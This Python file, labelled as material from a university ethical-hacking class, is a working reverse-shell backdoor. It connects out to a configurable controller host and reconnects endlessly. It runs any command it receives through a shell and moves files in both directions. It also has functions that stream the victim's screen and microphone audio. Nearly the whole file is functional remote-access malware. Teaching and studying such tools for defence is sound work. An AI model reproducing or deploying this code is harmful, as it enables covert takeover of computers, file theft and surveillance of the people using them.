################################################
# Author: Watthanasak Jeamwatthanachai, PhD    #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

import socket
import time
import subprocess
import json
import os
import cv2
import numpy as np
import pyautogui
import struct
import mss
import pyaudio
import sys
from dotenv import load_dotenv

# Load environment variables from .env file
dotenv_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../.env'))
print(dotenv_path)
load_dotenv(dotenv_path)

# Set variables based on .env values
TARGET_IP = os.getenv("TARGET_IP", "127.0.0.1")
TARGET_PORT = int(os.getenv("TARGET_PORT", 5000))
VIDEO_PORT = int(os.getenv("VIDEO_PORT", 9000))
AUDIO_PORT = int(os.getenv("AUDIO_PORT", 6000))

# Use these variables in your code
print(f"Target IP: {TARGET_IP}")
print(f"Target Port: {TARGET_PORT}")
print(f"Video Port: {VIDEO_PORT}")
print(f"Audio Port: {AUDIO_PORT}")
reconnection_delay = 1

# Constants for audio streaming
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def connection():
    while True:
        time.sleep(reconnection_delay)
        try:
            s.connect((TARGET_IP, TARGET_PORT))
            shell()
            s.close()
            break
        except:
            connection()

def upload_file(file_name):
    if not os.path.isfile(file_name):
        error_message = f"ERROR: File '{file_name}' not found."
        s.send(error_message.encode())
        return
    
    with open(file_name, 'rb') as f:
        s.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

# Function to stream screen content
def screen_stream(client_socket):
    w, h = pyautogui.size()
    monitor = {"top": 0, "left": 0, "width": w, "height": h}
    
    try:
        t0 = time.time()
        n_frames = 1
        with mss.mss() as sct:
            while True:
                screen = sct.grab(monitor)
                frame = np.array(screen)
                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
                message = struct.pack(">L", len(buffer)) + buffer.tobytes()
                try:
                    client_socket.sendall(message)
                except BrokenPipeError:
                    print("Broken pipe error, connection lost.")
                    break

                elapsed_time = time.time() - t0
                avg_fps = (n_frames / elapsed_time)
                print("Screen Average FPS: " + str(avg_fps))
                n_frames += 1
    except KeyboardInterrupt:
        print("Stopped by user.")
    finally:
        client_socket.close()

# Function to stream audio content
def audio_stream(client_socket):
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)
    
    try:
        while True:
            data = stream.read(CHUNK, exception_on_overflow=False)
            client_socket.sendall(data)
    except KeyboardInterrupt:
        print("Stopped by user.")
    finally:
        stream.stop_stream()
        stream.close()
        p.terminate()
        client_socket.close()


def shell():
    global screen_socket, audio_socket

    while True:
        command = reliable_recv()

        # Common command
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            dir_change = command[3:]
            try:
                os.chdir(dir_change)
                reliable_send({'stdout': os.getcwd(), 'stderr': ''})
            except FileNotFoundError as e:
                reliable_send({'stdout': '', 'stderr': f'cd: no such file or directory: {dir_change}\n'})
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])

        # Screen Streaming
        elif command == 'screen':
            time.sleep(1)
            handle_screen_command()

        # Others
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

# Function to get the virtual environment path
def get_virtualenv_path():
    # Check if we are in a virtual environment
    if hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix):
        # Python is running in a virtual environment
        if sys.platform == 'win32':
            return os.path.join(sys.prefix, 'Scripts', 'activate.bat')
        else:
            return os.path.join(sys.prefix, 'bin', 'activate')

    # If not in a virtual environment, return None
    return None

# Function to handle screen command
def handle_screen_command():
    current_dir = os.path.abspath('.')
    script_path = os.path.join(current_dir, 'screenstream_client.py')

    virtualenv_activate = get_virtualenv_path()
    if virtualenv_activate:
        if os.name == 'posix':
            if 'darwin' in os.uname().sysname.lower():  # macOS
                # Create a new iTerm window and execute the command
                osascript_command = f'tell application "iTerm"\n' \
                                    f'  create window with default profile\n' \
                                    f'  tell current session of current window to write text "cd {os.path.dirname(script_path)} && source {virtualenv_activate} && python3 {os.path.basename(script_path)}"\n' \
                                    f'end tell'
                subprocess.Popen(["osascript", "-e", osascript_command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                # osascript_command = f'tell app "Terminal" to do script "cd {os.path.dirname(script_path)} && source {virtualenv_activate} && python3 {os.path.basename(script_path)}"'
                # subprocess.Popen(["osascript", "-e", osascript_command])
            else:  # Linux
                terminal_command = f'gnome-terminal -- bash -c "cd {current_dir} && source {virtualenv_activate} && python3 {script_path}; exec bash"'
                subprocess.Popen(terminal_command, shell=True)
        # Add elif block for other OS types if needed
    else:
        print("Virtual environment not found.")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()
